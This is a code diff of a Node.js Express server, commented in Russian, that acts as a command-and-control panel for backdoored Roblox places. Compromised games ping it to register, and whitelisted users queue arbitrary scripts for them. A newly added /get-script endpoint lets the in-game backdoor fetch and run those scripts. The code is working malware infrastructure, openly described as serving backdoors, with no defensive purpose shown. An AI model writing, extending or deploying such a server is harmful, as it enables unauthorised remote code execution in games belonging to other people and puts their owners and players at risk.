@@ -7,8 +7,8 @@ app.use(express.json());
 
 // База данных в памяти сервера
 let whitelist = ["sewarg47"];
-let activePlaces = {}; // Используем объект для хранения времени последнего пинга плейса: { placeId: timestamp }
-let pendingScripts = {};
+let activePlaces = {}; // { placeId: timestamp }
+let pendingScripts = {}; // Хранилище скриптов для каждого плейса
 
 // 1. Добавление ника в белый список с сайта
 app.post('/add-whitelist', (req, res) => {
@@ -34,11 +34,10 @@ app.get('/check-whitelist', (req, res) => {
     }
 });
 
-// 3. НОВОЕ: Авто-регистрация / пинг забекдоренного плейса из игры
+// 3. Авто-регистрация / пинг забекдоренного плейса из игры
 app.post('/ping-place', (req, res) => {
     const { placeId } = req.body;
     if (placeId) {
-        // Запоминаем текущее время для этого плейса
         activePlaces[placeId] = Date.now();
         res.json({ success: true });
     } else {
@@ -46,13 +45,12 @@ app.post('/ping-place', (req, res) => {
     }
 });
 
-// 4. Получение списка активных плейсов (автоматически удаляет те, что молчали больше 30 секунд)
+// 4. Получение списка активных плейсов
 app.get('/active-places', (req, res) => {
     const now = Date.now();
     let currentActive = [];
     
     for (let placeId in activePlaces) {
-        // Если игра не отправляла пинг больше 30 секунд, считаем её закрытой
         if (now - activePlaces[placeId] < 30000) {
             currentActive.push(placeId);
         } else {
@@ -63,14 +61,26 @@ app.get('/active-places', (req, res) => {
     res.json(currentActive);
 });
 
-// 5. Выполнение скрипта через веб-панель
+// 5. Эндпоинт для отправки скрипта с сайта
 app.post('/set-script', (req, res) => {
     const { placeId, command, nick } = req.body;
     if (!whitelist.includes(nick)) {
         return res.json({ success: false, status: 'not_in_whitelist' });
     }
-    pendingScripts[placeId] = command;
+    pendingScripts[placeId] = command; // Сохраняем код для конкретного плейса
     res.json({ success: true });
+});
+
+// 6. Новый эндпоинт: бэкдор из Роблокса забирает отсюда готовый скрипт на выполнение
+app.get('/get-script', (req, res) => {
+    const placeId = req.query.placeId;
+    if (pendingScripts[placeId]) {
+        const code = pendingScripts[placeId];
+        delete pendingScripts[placeId]; // Удаляем после отправки
+        res.json({ success: true, code: code });
+    } else {
+        res.json({ success: false });
+    }
 });
 
 const PORT = process.env.PORT || 3000;
